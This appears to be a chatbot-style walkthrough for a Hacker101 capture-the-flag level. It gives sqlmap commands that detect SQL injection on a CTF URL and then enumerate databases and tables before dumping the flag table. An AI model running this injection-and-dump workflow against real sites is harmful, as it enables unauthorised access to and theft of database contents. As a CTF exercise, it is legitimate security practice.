### Step 1: Install sqlmap

It’s a Python tool, so it’s very lightweight and will run perfectly on your 512MB VPS.


```
sudo apt install sqlmap -y
```

---

### Step 2: The "Magic" Discovery Command

First, we tell sqlmap to just "look" at the URL and see if it can find the bug.

**Run this exactly:**

```
sqlmap -u "https://862a4b8ea6440808a6f68b56f32cc977.ctf.hacker101.com/fetch?id=1" --batch --banner --exclude-sysdbs
```

- **-u**: The target URL.
- **--batch**: Tells sqlmap to "Just do your thing" and not ask you 50 questions.
- **--banner**: Asks the database "Who are you?" (e.g., SQLite, MySQL, PostgreSQL).
- - **--exclude-sysdbs**: Skips the boring system files so you only see the CTF data.

---

### Step 3: Finding the Databases (The Loot)

If the command above says **"id is vulnerable,"** you have won. Now you start digging.

Ask for a list of databases:


```
sqlmap -u "https://[URL]/fetch?id=1" --batch --dbs
```

---

### Step 4: Finding the Tables

Once you see the database name (it might be called level1 or public), you look for the tables inside it:

```
# Replace DATABASE_NAME with what you found in Step 3
sqlmap -u "https://[URL]/fetch?id=1" --batch -D DATABASE_NAME --tables
```

---

### Step 5: Stealing the Flag (The Dump)

Look for a table named **flags** or **secrets**. Once you find it, you tell sqlmap to "dump" all the content in that table:


```
# Replace TABLE_NAME with the flag table you found
sqlmap -u "https://[URL]/fetch?id=1" --batch -T TABLE_NAME --dump
```
